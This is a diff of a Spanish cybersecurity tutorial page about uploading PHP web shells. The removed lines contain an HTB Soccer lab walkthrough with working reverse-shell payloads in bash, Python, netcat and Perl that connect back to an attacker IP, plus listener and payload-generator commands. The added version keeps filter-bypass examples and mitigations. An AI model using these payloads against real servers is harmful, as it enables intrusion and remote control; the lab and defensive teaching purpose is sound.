@@ -3,16 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Aprende técnicas de subida de archivos maliciosos (Web Shell) para pentesting. Guía completa con HTB Soccer, reverse shells y medidas de protección.">
-    <meta name="keywords" content="web shell, file upload, reverse shell, pentesting, malicious upload, HTB Soccer, PHP shell">
-    <title>Subida de Archivos Maliciosos - Web Shell | HackingUsef</title>
+    <meta name="description" content="Subida de Web Shells: bypass de filtros, ejecución remota y mitigaciones. Guía educativa completa para pentesting seguro.">
+    <meta name="keywords" content="web shell, file upload, bypass, RCE, PHP shell, pentesting">
+    <title>Subida de Web Shell - Bypass y Mitigaciones | HackingUsef</title>
     
-    <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
@@ -31,403 +28,55 @@
             --gradient-primary: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: var(--dark-bg); color: var(--text-primary); line-height: 1.7; min-height: 100vh; overflow-x: hidden; }
+        
+        .animated-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e); background-size: 400% 400%; animation: gradientShift 15s ease infinite; }
+        @keyframes gradientShift { 0% { background-position: 0% 50% } 50% { background-position: 100% 50% } 100% { background-position: 0% 50% } }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--dark-bg);
-            color: var(--text-primary);
-            line-height: 1.7;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
+        .matrix-rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; opacity: 0.1; }
+        .matrix-column { position: absolute; color: var(--primary-color); font-family: 'JetBrains Mono', monospace; font-size: 14px; animation: matrixFall linear infinite; }
+        @keyframes matrixFall { 0% { transform: translateY(-100vh); opacity: 1 } 100% { transform: translateY(100vh); opacity: 0 } }
 
-        /* Animated background */
-        .animated-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e);
-            background-size: 400% 400%;
-            animation: gradientShift 15s ease infinite;
-        }
+        .container { max-width: 1000px; margin: 0 auto; padding: 2rem; position: relative; z-index: 1; }
+        .header { text-align: center; padding: 2rem 0 3rem; border-bottom: 1px solid var(--border-color); margin-bottom: 3rem; }
+        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--primary-color); text-decoration: none; margin-bottom: 2rem; font-size: 0.9rem; transition: all 0.3s ease; }
+        .back-link:hover { transform: translateX(-5px); }
 
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
+        .logo-container { position: relative; display: inline-block; margin-bottom: 2rem; }
+        .logo-matrix { width: 120px; height: 120px; background: var(--darker-bg); border: 2px solid var(--primary-color); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 1.8rem; font-weight: 700; color: var(--primary-color); box-shadow: 0 0 30px rgba(0, 255, 136, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden; }
+        .logo-matrix:hover { transform: scale(1.05) rotateX(5deg); box-shadow: 0 0 50px rgba(0, 255, 136, 0.5); }
+        .logo-matrix::before { content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; background: linear-gradient(45deg, var(--primary-color), transparent, var(--primary-color)); border-radius: 12px; z-index: -1; animation: borderGlow 2s ease-in-out infinite alternate; }
+        @keyframes borderGlow { 0% { opacity: .5 } 100% { opacity: 1 } }
+        .logo-text { position: relative; z-index: 2; }
+        .logo-text::after { content: ''; position: absolute; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,.03) 2px, rgba(0,255,136,.03) 4px); animation: scanLines 2s linear infinite; }
+        @keyframes scanLines { 0% { transform: translateY(-100%) } 100% { transform: translateY(100%) } }
 
-        /* Matrix rain effect */
-        .matrix-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
-            opacity: 0.1;
-        }
+        h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 1rem; background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .subtitle { font-size: 1.2rem; color: var(--text-secondary); font-weight: 300; }
 
-        .matrix-column {
-            position: absolute;
-            color: var(--primary-color);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 14px;
-            animation: matrixFall linear infinite;
-        }
+        .section { margin-bottom: 4rem; }
+        h2 { color: var(--primary-color); font-size: 1.8rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.8rem; }
+        h3 { color: var(--secondary-color); font-size: 1.4rem; margin: 2rem 0 1rem; }
+        h4 { color: var(--accent-color); font-size: 1.2rem; margin: 1.5rem 0 .8rem; }
+        p { margin-bottom: 1.5rem; color: var(--text-primary); }
 
-        @keyframes matrixFall {
-            0% {
-                transform: translateY(-100vh);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(100vh);
-                opacity: 0;
-            }
-        }
+        .alert { padding: 1.5rem; border-radius: 8px; margin: 2rem 0; border-left: 4px solid; }
+        .alert-definition { background: rgba(0,255,136,.1); border-color: var(--primary-color); }
+        .alert-danger { background: rgba(231,76,60,.1); border-color: #e74c3c; }
+        .alert-info { background: rgba(124,58,237,.1); border-color: var(--accent-color); }
+        .alert-warning { background: rgba(255,107,53,.1); border-color: var(--secondary-color); }
 
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 2rem;
-            position: relative;
-            z-index: 1;
-        }
+        .code-block { background: var(--code-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 2rem 0; position: relative; overflow-x: auto; }
+        .code-block code { font-family: 'JetBrains Mono', monospace; color: var(--primary-color); font-size: 0.95rem; white-space: pre; }
+        .code-label { position: absolute; top: -12px; left: 1rem; background: var(--card-bg); color: var(--text-secondary); padding: .3rem .8rem; font-size: .8rem; border-radius: 4px; border: 1px solid var(--border-color); }
 
-        /* Header */
-        .header {
-            text-align: center;
-            padding: 2rem 0 3rem;
-            border-bottom: 1px solid var(--border-color);
-            margin-bottom: 3rem;
-        }
+        ul { margin-left: 1.5rem; margin-bottom: 1.5rem; }
+        li { margin-bottom: .5rem; color: var(--text-primary); }
 
-        .back-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            color: var(--primary-color);
-            text-decoration: none;
-            margin-bottom: 2rem;
-            font-size: 0.9rem;
-            transition: all 0.3s ease;
-        }
+        .footer { text-align: center; padding: 3rem 0 2rem; border-top: 1px solid var(--border-color); margin-top: 4rem; color: var(--text-muted); }
 
-        .back-link:hover {
-            transform: translateX(-5px);
-        }
-
-        .logo-container {
-            position: relative;
-            display: inline-block;
-            margin-bottom: 2rem;
-        }
-
-        .logo-matrix {
-            width: 120px;
-            height: 120px;
-            background: var(--darker-bg);
-            border: 2px solid var(--primary-color);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: var(--primary-color);
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .logo-matrix:hover {
-            transform: scale(1.05) rotateX(5deg);
-            box-shadow: 0 0 50px rgba(0, 255, 136, 0.5);
-        }
-
-        .logo-matrix::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, var(--primary-color), transparent, var(--primary-color));
-            border-radius: 12px;
-            z-index: -1;
-            animation: borderGlow 2s ease-in-out infinite alternate;
-        }
-
-        @keyframes borderGlow {
-            0% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .logo-text {
-            position: relative;
-            z-index: 2;
-        }
-
-        .logo-text::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent,
-                transparent 2px,
-                rgba(0, 255, 136, 0.03) 2px,
-                rgba(0, 255, 136, 0.03) 4px
-            );
-            animation: scanLines 2s linear infinite;
-        }
-
-        @keyframes scanLines {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
-        }
-
-        h1 {
-            font-size: 2.8rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            background: var(--gradient-primary);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .subtitle {
-            font-size: 1.2rem;
-            color: var(--text-secondary);
-            font-weight: 300;
-        }
-
-        /* Content sections */
-        .section {
-            margin-bottom: 4rem;
-        }
-
-        h2 {
-            color: var(--primary-color);
-            font-size: 1.8rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-        }
-
-        h3 {
-            color: var(--secondary-color);
-            font-size: 1.4rem;
-            margin: 2rem 0 1rem;
-        }
-
-        h4 {
-            color: var(--accent-color);
-            font-size: 1.2rem;
-            margin: 1.5rem 0 0.8rem;
-        }
-
-        p {
-            margin-bottom: 1.5rem;
-            color: var(--text-primary);
-        }
-
-        /* Alert boxes */
-        .alert {
-            padding: 1.5rem;
-            border-radius: 8px;
-            margin: 2rem 0;
-            border-left: 4px solid;
-        }
-
-        .alert-definition {
-            background: rgba(0, 255, 136, 0.1);
-            border-color: var(--primary-color);
-        }
-
-        .alert-danger {
-            background: rgba(231, 76, 60, 0.1);
-            border-color: #e74c3c;
-        }
-
-        .alert-info {
-            background: rgba(124, 58, 237, 0.1);
-            border-color: var(--accent-color);
-        }
-
-        .alert-warning {
-            background: rgba(255, 107, 53, 0.1);
-            border-color: var(--secondary-color);
-        }
-
-        /* Code blocks */
-        .code-block {
-            background: var(--code-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 2rem 0;
-            position: relative;
-            overflow-x: auto;
-        }
-
-        .code-block code {
-            font-family: 'JetBrains Mono', monospace;
-            color: var(--primary-color);
-            font-size: 0.95rem;
-            white-space: pre;
-        }
-
-        .code-label {
-            position: absolute;
-            top: -12px;
-            left: 1rem;
-            background: var(--card-bg);
-            color: var(--text-secondary);
-            padding: 0.3rem 0.8rem;
-            font-size: 0.8rem;
-            border-radius: 4px;
-            border: 1px solid var(--border-color);
-        }
-
-        /* Example sections */
-        .example {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 2rem;
-            margin: 3rem 0;
-        }
-
-        .example-title {
-            color: var(--secondary-color);
-            font-size: 1.3rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .machine-info {
-            background: rgba(124, 58, 237, 0.1);
-            border: 1px solid var(--accent-color);
-            border-radius: 6px;
-            padding: 1rem;
-            margin: 1rem 0;
-            font-size: 0.9rem;
-        }
-
-        /* Attack flow */
-        .attack-flow {
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-            margin: 2rem 0;
-        }
-
-        .flow-step {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            padding: 1rem;
-            background: var(--card-bg);
-            border-radius: 8px;
-            border-left: 4px solid var(--primary-color);
-        }
-
-        .flow-number {
-            background: var(--primary-color);
-            color: var(--dark-bg);
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
-
-        .flow-content {
-            flex: 1;
-        }
-
-        .flow-title {
-            color: var(--primary-color);
-            font-weight: 600;
-            margin-bottom: 0.3rem;
-        }
-
-        .flow-desc {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        ul {
-            margin-left: 1.5rem;
-            margin-bottom: 1.5rem;
-        }
-
-        li {
-            margin-bottom: 0.5rem;
-            color: var(--text-primary);
-        }
-
-        .footer {
-            text-align: center;
-            padding: 3rem 0 2rem;
-            border-top: 1px solid var(--border-color);
-            margin-top: 4rem;
-            color: var(--text-muted);
-        }
-
-        .threat-level {
-            display: inline-block;
-            padding: 0.3rem 0.8rem;
-            border-radius: 4px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            text-transform: uppercase;
-        }
-
-        .threat-critical {
-            background: rgba(231, 76, 60, 0.2);
-            color: #e74c3c;
-            border: 1px solid #e74c3c;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 1rem;
-            }
-            
-            h1 {
-                font-size: 2.2rem;
-            }
-            
-            .logo-matrix {
-                width: 100px;
-                height: 100px;
-                font-size: 1.5rem;
-            }
-        }
+        @media (max-width: 768px) { .container { padding: 1rem; } h1 { font-size: 2.2rem; } .logo-matrix { width: 100px; height: 100px; font-size: 1.5rem; } }
     </style>
 </head>
 
@@ -437,377 +86,93 @@
 
     <div class="container">
         <header class="header">
-            <a href="../" class="back-link">
-                <i class="fas fa-arrow-left"></i>
-                Volver al inicio
-            </a>
+            <a href="../" class="back-link"><i class="fas fa-arrow-left"></i>Volver al inicio</a>
             <div class="logo-container">
-                <div class="logo-matrix">
-                    <div class="logo-text">&lt;/&gt;</div>
-                </div>
+                <div class="logo-matrix"><div class="logo-text">&lt;/&gt;</div></div>
             </div>
-            <h1>Subida de Archivos Maliciosos</h1>
-            <p class="subtitle">Web Shells y Técnicas de Penetración</p>
+            <h1>Subida de Web Shell</h1>
+            <p class="subtitle">Bypass de Filtros y Ejecución Remota de Código</p>
         </header>
 
         <main>
             <section class="section">
-                <h2><i class="fas fa-upload"></i>¿Qué es una Web Shell?</h2>
-                
+                <h2><i class="fas fa-bug"></i>¿Qué es una Web Shell?</h2>
                 <div class="alert alert-definition">
-                    <p><strong>Definición:</strong> Una Web Shell es un script o programa malicioso que se instala en un servidor web para proporcionar a los atacantes acceso remoto y control completo sobre el sistema a través de una interfaz basada en web. Esta herramienta permite ejecutar comandos del sistema, manipular archivos y llevar a cabo acciones maliciosas en el servidor comprometido.</p>
+                    <p>Una <strong>web shell</strong> es un script malicioso subido a un servidor web que permite ejecutar comandos remotamente. Se utiliza para <strong>RCE</strong>, exfiltración y movimiento lateral tras comprometer funcionalidades de upload.</p>
                 </div>
-
-                <div class="threat-level threat-critical">Nivel de amenaza: Crítico</div>
-
-                <p>Las Web Shells representan una de las amenazas más serias en ciberseguridad, ya que permiten:</p>
+                
+                <h3>Vectores de Ataque</h3>
                 <ul>
-                    <li><strong>Ejecución remota de comandos:</strong> Control total del sistema operativo</li>
-                    <li><strong>Persistencia:</strong> Mantienen acceso continuo al servidor</li>
-                    <li><strong>Escalación de privilegios:</strong> Potencial para obtener permisos de administrador</li>
-                    <li><strong>Movimiento lateral:</strong> Compromiso de otros sistemas en la red</li>
-                    <li><strong>Exfiltración de datos:</strong> Acceso a información sensible</li>
-                </ul>
-
-                <div class="alert alert-danger">
-                    <p><strong>Impacto de Seguridad:</strong> Una Web Shell exitosa puede resultar en compromiso completo del servidor, pérdida de datos confidenciales, instalación de malware adicional y uso del servidor como plataforma para ataques posteriores.</p>
-                </div>
-            </section>
-
-            <section class="section">
-                <h2><i class="fas fa-cogs"></i>Tipos de Web Shells</h2>
-
-                <h3>Por Lenguaje de Programación:</h3>
-                <ul>
-                    <li><strong>PHP Shells:</strong> Las más comunes (c99.php, r57.php, WSO)</li>
-                    <li><strong>ASP/ASPX Shells:</strong> Para servidores Windows IIS</li>
-                    <li><strong>JSP Shells:</strong> Para aplicaciones Java</li>
-                    <li><strong>Python Shells:</strong> Para frameworks Django/Flask</li>
-                </ul>
-
-                <h3>Por Funcionalidad:</h3>
-                <ul>
-                    <li><strong>Shells Simples:</strong> Ejecución básica de comandos</li>
-                    <li><strong>Shells Avanzadas:</strong> Interfaz gráfica completa</li>
-                    <li><strong>Backdoors:</strong> Acceso encubierto y persistente</li>
-                    <li><strong>Shells de Conexión Inversa:</strong> Reverse shells para evadir firewalls</li>
+                    <li>Validación débil de extensiones</li>
+                    <li>Confianza en Content-Type manipulable</li>
+                    <li>Subidas en directorios ejecutables</li>
+                    <li>Falta de análisis de contenido real</li>
                 </ul>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-server"></i>Caso Práctico: HTB Soccer</h2>
-
-                <div class="example">
-                    <div class="example-title">
-                        <i class="fas fa-futbol"></i>
-                        Explotación de Subida de Archivos - HTB Soccer (10.10.11.194)
-                    </div>
-                    
-                    <div class="machine-info">
-                        <strong>Escenario del ataque:</strong>
-                        <ul>
-                            <li><strong>Objetivo:</strong> Obtener reverse shell a través de subida de archivos PHP</li>
-                            <li><strong>Vector de ataque:</strong> Funcionalidad de upload sin validación</li>
-                            <li><strong>Técnica:</strong> Web Shell PHP con reverse connection</li>
-                            <li><strong>Resultado esperado:</strong> Acceso remoto al servidor</li>
-                        </ul>
-                    </div>
-
-                    <h4>Metodología de Explotación:</h4>
-                    
-                    <div class="attack-flow">
-                        <div class="flow-step">
-                            <div class="flow-number">1</div>
-                            <div class="flow-content">
-                                <div class="flow-title">Reconocimiento</div>
-                                <div class="flow-desc">Identificación de funcionalidad de subida de archivos vulnerable</div>
-                            </div>
-                        </div>
-                        
-                        <div class="flow-step">
-                            <div class="flow-number">2</div>
-                            <div class="flow-content">
-                                <div class="flow-title">Creación de Payload</div>
-                                <div class="flow-desc">Desarrollo de Web Shell PHP con reverse shell</div>
-                            </div>
-                        </div>
-                        
-                        <div class="flow-step">
-                            <div class="flow-number">3</div>
-                            <div class="flow-content">
-                                <div class="flow-title">Subida y Ejecución</div>
-                                <div class="flow-desc">Upload del archivo malicioso y activación del payload</div>
-                            </div>
-                        </div>
-                        
-                        <div class="flow-step">
-                            <div class="flow-number">4</div>
-                            <div class="flow-content">
-                                <div class="flow-title">Establecimiento de Shell</div>
-                                <div class="flow-desc">Obtención de acceso remoto y control del sistema</div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <h4>Fase 1: Reconocimiento del Vector de Ataque</h4>
-                    <p>El primer paso es identificar la funcionalidad de subida de archivos en la aplicación web:</p>
-                    
-                    <div class="alert alert-info">
-                        <p><strong>Observación:</strong> En el sitio web de HTB Soccer se identifica un formulario de upload que acepta archivos PHP sin validación adecuada de contenido o extensión.</p>
-                    </div>
-
-                    <h4>Fase 2: Creación del Payload Malicioso</h4>
-                    <p>Desarrollamos una Web Shell PHP que establecerá una conexión inversa a nuestra máquina atacante:</p>
-                    
-                    <div class="code-block">
-                        <div class="code-label">malicious.php</div>
-                        <code><?php
-// Web Shell con Reverse Connection
-system("bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'");
-?></code>
-                    </div>
-
-                    <div class="alert alert-warning">
-                        <p><strong>Explicación del código:</strong></p>
-                        <ul>
-                            <li><code>system()</code>: Ejecuta comandos del sistema operativo</li>
-                            <li><code>bash -i</code>: Inicia shell interactivo de Bash</li>
-                            <li><code>>&</code>: Redirige stdout y stderr</li>
-                            <li><code>/dev/tcp/IP/PORT</code>: Conexión TCP a máquina atacante</li>
-                            <li><code>0>&1</code>: Redirige stdin al socket TCP</li>
-                        </ul>
-                    </div>
-
-                    <h4>Alternativas de Payload:</h4>
-                    <div class="code-block">
-                        <div class="code-label">Payloads Alternativos</div>
-                        <code># Reverse Shell con Python
-<?php system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"); ?>
-
-# Reverse Shell con Netcat
-<?php system("nc -e /bin/bash 10.10.14.14 443"); ?>
-
-# Reverse Shell con Perl
-<?php system("perl -e 'use Socket;\$i=\"10.10.14.14\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"); ?></code>
-                    </div>
-
-                    <h4>Fase 3: Preparación del Listener</h4>
-                    <p>Antes de subir el archivo, establecemos un listener en nuestra máquina atacante:</p>
-                    
-                    <div class="code-block">
-                        <div class="code-label">Comando en Máquina Atacante (10.10.14.14)</div>
-                        <code># Listener con Netcat
-nc -lvnp 443
-
-# Listener con Metasploit (alternativa)
-msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set LHOST 10.10.14.14; set LPORT 443; exploit"</code>
-                    </div>
-
-                    <h4>Fase 4: Subida y Ejecución</h4>
-                    <p>Subimos el archivo malicioso a través del formulario web y lo ejecutamos:</p>
-                    
-                    <div class="code-block">
-                        <div class="code-label">Ejecución del Payload</div>
-                        <code># Acceso directo via navegador
-http://soccer.htb/tiny/uploads/malicious.php
-
-# Ejecución con cURL
-curl http://soccer.htb/tiny/uploads/malicious.php
-
-# Ejecución con wget
-wget -qO- http://soccer.htb/tiny/uploads/malicious.php</code>
-                    </div>
-
-                    <div class="alert alert-info">
-                        <p><strong>Resultado Exitoso:</strong> Una vez ejecutado el payload, obtenemos una reverse shell en nuestro listener, proporcionando acceso completo al sistema comprometido.</p>
-                    </div>
-                </div>
-            </section>
-
-            <section class="section">
-                <h2><i class="fas fa-tools"></i>Herramientas y Técnicas Avanzadas</h2>
-
-                <h3>Herramientas Especializadas:</h3>
+                <h2><i class="fas fa-mask"></i>Técnicas de Bypass</h2>
+                
                 <div class="code-block">
-                    <div class="code-label">Generadores de Web Shells</div>
-                    <code># Weevely - Web Shell avanzada con capacidades stealth
-weevely generate password123 /path/to/shell.php
-weevely http://target.com/shell.php password123
+                    <div class="code-label">Extensiones y MIME</div>
+                    <code># Extensiones dobles
+shell.php.jpg
 
-# MSFVenom - Generador de payloads
-msfvenom -p php/reverse_php LHOST=10.10.14.14 LPORT=443 -f raw > shell.php
+# Case variations
+shell.PHP
 
-# Laudanum - Colección de shells
-cp /usr/share/laudanum/php/php-reverse-shell.php ./
-
-# PHPBash - Web Shell interactiva
-git clone https://github.com/Arrexel/phpbash.git</code>
+# Content-Type forzado
+curl -F "file=@shell.php;type=image/jpeg" target/upload</code>
                 </div>
-
-                <h3>Técnicas de Evasión:</h3>
-                <ul>
-                    <li><strong>Ofuscación de código:</strong> Codificación Base64, ROT13, o custom encoding</li>
-                    <li><strong>Extensiones dobles:</strong> file.php.jpg, file.php.txt</li>
-                    <li><strong>Null byte injection:</strong> file.php%00.jpg</li>
-                    <li><strong>Case sensitivity:</strong> .PHP, .pHp, .Php</li>
-                    <li><strong>MIME type spoofing:</strong> Manipulación de Content-Type headers</li>
-                </ul>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-shield-alt"></i>Medidas de Protección</h2>
-
-                <div class="alert alert-warning">
-                    <p><strong>Controles de Seguridad Esenciales:</strong></p>
-                    <ul>
-                        <li><strong>Validación de extensiones:</strong> Lista blanca de tipos de archivo permitidos</li>
-                        <li><strong>Verificación de contenido:</strong> Análisis del contenido real del archivo</li>
-                        <li><strong>Sandbox execution:</strong> Ejecución en entornos aislados</li>
-                        <li><strong>Límites de tamaño:</strong> Restricciones en el tamaño de archivo</li>
-                        <li><strong>Análisis antimalware:</strong> Escáner de malware integrado</li>
-                    </ul>
-                </div>
-
-                <h3>Implementación Segura - PHP:</h3>
-                <div class="code-block">
-                    <div class="code-label">Código PHP Seguro</div>
-                    <code><?php
-function secureFileUpload($file) {
-    // Lista blanca de extensiones permitidas
-    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
-    $allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
-    
-    $fileInfo = pathinfo($file['name']);
-    $extension = strtolower($fileInfo['extension']);
-    $mimeType = mime_content_type($file['tmp_name']);
-    
-    // Validar extensión
-    if (!in_array($extension, $allowedExtensions)) {
-        throw new Exception('Tipo de archivo no permitido');
-    }
-    
-    // Validar MIME type
-    if (!in_array($mimeType, $allowedMimeTypes)) {
-        throw new Exception('MIME type no válido');
-    }
-    
-    // Validar tamaño (5MB máximo)
-    if ($file['size'] > 5 * 1024 * 1024) {
-        throw new Exception('Archivo demasiado grande');
-    }
-    
-    // Generar nombre único
-    $newFilename = uniqid() . '.' . $extension;
-    $uploadPath = '/var/www/uploads/' . $newFilename;
-    
-    // Mover archivo fuera del webroot
-    if (!move_uploaded_file($file['tmp_name'], $uploadPath)) {
-        throw new Exception('Error al subir archivo');
-    }
-    
-    return $newFilename;
-}
-?></code>
-                </div>
-
-                <h3>Configuración del Servidor Web:</h3>
+                <h2><i class="fas fa-shield-alt"></i>Mitigaciones</h2>
+                <ul>
+                    <li>Allowlist estricta de extensiones</li>
+                    <li>Validación MIME real del contenido</li>
+                    <li>Almacenamiento fuera del docroot</li>
+                    <li>Deshabilitar ejecución en directorios upload</li>
+                </ul>
+                
                 <div class="code-block">
                     <div class="code-label">Apache .htaccess</div>
-                    <code># Deshabilitar ejecución de PHP en directorio de uploads
-<Files ~ "\.php$">
-    Order allow,deny
-    Deny from all
-</Files>
-
-# Restringir tipos de archivo
-<FilesMatch "\.(php|php3|php4|php5|phtml|pl|py|jsp|asp|sh|cgi)$">
-    Order Allow,Deny
-    Deny from all
-</FilesMatch></code>
+                    <code>php_flag engine off
+RemoveHandler .php .phtml
+ForceType application/octet-stream</code>
                 </div>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-search"></i>Detección y Respuesta</h2>
-
-                <h3>Indicadores de Compromiso (IOCs):</h3>
-                <ul>
-                    <li><strong>Archivos sospechosos:</strong> Scripts con nombres inusuales en directorios web</li>
-                    <li><strong>Conexiones de red:</strong> Tráfico TCP saliente no autorizado</li>
-                    <li><strong>Logs de acceso:</strong> Requests a archivos PHP en directorios de upload</li>
-                    <li><strong>Procesos anómalos:</strong> Shells iniciados por proceso web</li>
-                </ul>
-
-                <h3>Comandos de Detección:</h3>
-                <div class="code-block">
-                    <div class="code-label">Búsqueda de Web Shells</div>
-                    <code># Buscar archivos PHP en directorios de upload
-find /var/www -name "*.php" -path "*/upload*" -ls
-
-# Buscar strings sospechosos en archivos PHP
-grep -r "system\|exec\|shell_exec\|passthru" /var/www/html/uploads/
-
-# Monitorear conexiones de red
-netstat -antup | grep :80
-
-# Revisar logs de acceso web
-tail -f /var/log/apache2/access.log | grep -i "\.php"</code>
-                </div>
-            </section>
-
-            <section class="section">
-                <h2><i class="fas fa-exclamation-triangle"></i>Consideraciones Éticas y Legales</h2>
-                
+                <h2><i class="fas fa-exclamation-triangle"></i>Advertencia Legal</h2>
                 <div class="alert alert-danger">
-                    <p><strong>Advertencia Legal:</strong> Las técnicas de Web Shell solo deben utilizarse en:</p>
-                    <ul>
-                        <li>Sistemas propios o con autorización explícita por escrito</li>
-                        <li>Entornos de pentesting con contratos legales válidos</li>
-                        <li>Plataformas de práctica autorizadas (HTB, TryHackMe, VulnHub)</li>
-                        <li>Laboratorios controlados de ciberseguridad</li>
-                    </ul>
-                    <p>La instalación no autorizada de Web Shells constituye un delito grave de acceso ilegal a sistemas informáticos según las legislaciones locales e internacionales.</p>
-                </div>
-
-                <div class="alert alert-info">
-                    <p><strong>Uso Ético:</strong> Estas técnicas deben emplearse exclusivamente para mejorar la seguridad, identificar vulnerabilidades y proteger sistemas. Nunca para causar daño, robar información o comprometer sistemas sin autorización.</p>
+                    <p>Contenido educativo. Solo para laboratorios controlados o con autorización explícita.</p>
                 </div>
             </section>
         </main>
 
         <footer class="footer">
             <p>&copy; 2024 HackingUsef - Educación en Ciberseguridad</p>
-            <p>Contenido educativo para profesionales de la seguridad informática</p>
         </footer>
     </div>
 
     <script>
-        // Matrix rain effect
         function createMatrixRain() {
             const container = document.getElementById('matrix-rain');
-            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
-            
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン</>(){}[]';
             for (let i = 0; i < 50; i++) {
                 const column = document.createElement('div');
                 column.className = 'matrix-column';
                 column.style.left = Math.random() * 100 + '%';
                 column.style.animationDuration = (Math.random() * 3 + 2) + 's';
                 column.style.animationDelay = Math.random() * 2 + 's';
-                
                 let text = '';
-                for (let j = 0; j < 20; j++) {
-                    text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
-                }
+                for (let j = 0; j < 20; j++) text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
                 column.innerHTML = text;
-                
                 container.appendChild(column);
             }
         }
-
-        // Initialize effects
-        document.addEventListener('DOMContentLoaded', () => {
-            createMatrixRain();
-        });
+        document.addEventListener('DOMContentLoaded', createMatrixRain);
     </script>
 </body>
 </html>
